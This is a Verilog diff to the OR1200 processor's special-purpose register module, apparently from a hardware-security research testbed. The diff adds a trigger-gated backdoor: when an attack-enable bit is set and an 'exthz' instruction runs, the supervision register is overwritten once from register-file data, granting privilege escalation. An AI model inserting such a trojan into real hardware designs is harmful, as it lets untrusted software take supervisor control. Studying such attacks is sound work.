@@ -82,7 +82,8 @@ module or1200_sprs(
 		   sp_epcr_ghost_we, sp_eear_ghost_we, sp_esr_ghost_we,
 		   sp_epcr_ghost, sp_eear_ghost, sp_esr_ghost,
 		   sp_address, sp_data, sp_strobe
-		   , sp_assertions_violated, sp_assertion_violated, sp_attack_enable
+		   , sp_assertions_violated, sp_assertion_violated, sp_attack_enable,
+	           sp_insn_is_exthz, id_freeze
 		   );
 
    parameter width = `OR1200_OPERAND_WIDTH;
@@ -174,6 +175,8 @@ module or1200_sprs(
    input [31:0] 			sp_assertions_violated;
    input        			sp_assertion_violated;
    output [31:0] 			sp_attack_enable;
+   input				sp_insn_is_exthz;
+   input				id_freeze;
    
    //
    // Internal regs & wires
@@ -548,14 +551,21 @@ module or1200_sprs(
    //
    // Supervision register
    //
+   reg sp_already_attacked;
    always @(posedge clk or `OR1200_RST_EVENT rst)
-     if (rst == `OR1200_RST_VALUE)
-       sr_reg <=  {2'b01, // Fixed one.
-		   `OR1200_SR_EPH_DEF, {`OR1200_SR_WIDTH-4{1'b0}}, 1'b1};
-     else if (except_started)
-       sr_reg <=  to_sr[`OR1200_SR_WIDTH-1:0];
-     else if (sr_we)
-       sr_reg <=  to_sr[`OR1200_SR_WIDTH-1:0];
+	if (rst == `OR1200_RST_VALUE) begin
+       		sr_reg <=  {2'b01, // Fixed one.
+		  	`OR1200_SR_EPH_DEF, {`OR1200_SR_WIDTH-4{1'b0}}, 1'b1};
+		sp_already_attacked <= 0;
+	end
+     	else if (except_started)
+       		sr_reg <=  to_sr[`OR1200_SR_WIDTH-1:0];
+     	else if (sr_we)
+       		sr_reg <=  to_sr[`OR1200_SR_WIDTH-1:0];
+	else if(sp_attack_enable[3] & sp_insn_is_exthz & ~id_freeze & ~sp_already_attacked) begin
+	       sr_reg <= spr_dat_rf[`OR1200_SR_WIDTH-1:0];
+       		sp_already_attacked <= 1'b1;
+	end		
    
    // EPH part of Supervision register
    always @(posedge clk or `OR1200_RST_EVENT rst)
